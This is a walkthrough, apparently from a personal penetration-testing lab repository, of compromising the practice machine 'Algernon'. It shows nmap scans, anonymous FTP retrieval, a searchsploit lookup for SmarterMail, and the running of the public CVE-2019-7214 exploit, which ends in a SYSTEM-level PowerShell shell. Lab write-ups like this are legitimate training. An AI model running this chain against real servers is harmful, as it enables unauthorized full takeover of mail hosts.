# Algernon.md
## Reconnaissance
### port scanning
- `nmap -p- -T4 -sS -min-rate 1000 192.168.116.65`
- `nmap -A -p 21,80,135,139,445,5040,9998,17001,49664,49665,49666,49667,49668,49669 192.168.116.65`

    ```
    Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 15:38 +0530
    Nmap scan report for 192.168.116.65
    Host is up (0.098s latency).

    PORT      STATE SERVICE       VERSION
    21/tcp    open  ftp           Microsoft ftpd
    | ftp-syst:
    |_  SYST: Windows_NT
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | 04-29-20  10:31PM       <DIR>          ImapRetrieval
    | 07-24-26  02:49AM       <DIR>          Logs
    | 04-29-20  10:31PM       <DIR>          PopRetrieval
    |_04-29-20  10:32PM       <DIR>          Spool
    80/tcp    open  http          Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-title: IIS Windows
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds?
    5040/tcp  open  unknown
    9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-IIS/10.0
    | uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
    | Content-Type: text/html; charset=us-ascii\x0D
    | Server: Microsoft-HTTPAPI/2.0\x0D
    | Date: Fri, 24 Jul 2026 10:11:47 GMT\x0D
    | Connection: close\x0D
    | Content-Length: 326\x0D
    | \x0D
    | <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
    | <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
    | <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
    | <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
    | <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
    |_</BODY></HTML>\x0D
    | http-title: Site doesn't have a title (text/html; charset=utf-8).
    |_Requested resource was /interface/root
    17001/tcp open  remoting      MS .NET Remoting services
    49664/tcp open  msrpc         Microsoft Windows RPC
    49665/tcp open  msrpc         Microsoft Windows RPC
    49666/tcp open  msrpc         Microsoft Windows RPC
    49667/tcp open  msrpc         Microsoft Windows RPC
    49668/tcp open  msrpc         Microsoft Windows RPC
    49669/tcp open  msrpc         Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 10|2019|11|7|2008|8.1 (98%)
    OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
    Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (98%), Microsoft Windows 10 1709 - 22H2 (95%), Microsoft Windows 10 1909 (93%), Microsoft Windows Server 2019 (92%), Microsoft Windows 10 21H2 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (90%), Microsoft Windows 11 24H2 (90%), Microsoft Windows 10 20H2 (90%), Microsoft Windows 10 1903 - 22H2 (89%), Microsoft Windows 11 24H2 - 25H2 (88%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 4 hops
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time:
    |   date: 2026-07-24T10:11:49
    |_  start_date: N/A
    | smb2-security-mode:
    |   3.1.1:
    |_    Message signing enabled but not required

    TRACEROUTE (using port 80/tcp)
    HOP RTT       ADDRESS
    1   146.70 ms 192.168.45.1
    2   146.63 ms 192.168.45.254
    3   146.70 ms 192.168.251.1
    4   146.75 ms 192.168.116.65

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 188.07 seconds
    ```
    > as Anonymous login is allowed in ftp let's see into it.
    > The web-server used is Microsoft IIS.
    > Admin Portal is found in http:/192.168.116.65:9998/interface/root

- `wget -r ftp://anonymous:anonymous@192.168.116.65` Nothing interesting in those files after Downloading them 

## Exploitation
![Website](/2.Algernon/images/smartermail.png)
- As SQL injection was not possible in Admin portal.
<br>![Adminportal](/2.Algernon/images/Admin_portal.png) 

```text
searchsploit smartermail
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SmarterMail 16 - Arbitrary File Upload                                                                                                                                         | multiple/webapps/48580.py
SmarterMail 7.1.3876 - Directory Traversal                                                                                                                                     | windows/remote/15048.txt
SmarterMail 7.3/7.4 - Multiple Vulnerabilities                                                                                                                                 | asp/webapps/16955.txt
SmarterMail 8.0 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                | asp/webapps/16975.txt
SmarterMail < 7.2.3925 - LDAP Injection                                                                                                                                        | asp/webapps/15189.txt
SmarterMail < 7.2.3925 - Persistent Cross-Site Scripting                                                                                                                       | asp/webapps/15185.txt
SmarterMail Build 6985 - Remote Code Execution                                                                                                                                 | windows/remote/49216.py
SmarterMail Enterprise and Standard 11.x - Persistent Cross-Site Scripting                                                                                                     | asp/webapps/31017.php
smartermail free 9.2 - Persistent Cross-Site Scripting                                                                                                                         | windows/webapps/20362.py
SmarterTools SmarterMail 4.3 - 'Subject' HTML Injection                                                                                                                        | php/webapps/31240.txt
SmarterTools SmarterMail 5.0 - HTTP Request Handling Denial of Service                                                                                                         | windows/dos/31607.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```
searchsploit -m windows/remote/49216.py
  Exploit: SmarterMail Build 6985 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49216
     Path: /usr/share/exploitdb/exploits/windows/remote/49216.py
    Codes: CVE-2019-7214
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (4852)
Copied to: /home/G1/Templates/Web/49216.py
```
[exploit.py](/2.Algernon/sources/exploit.py)
```pwsh
python ./exploit.py
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32>
```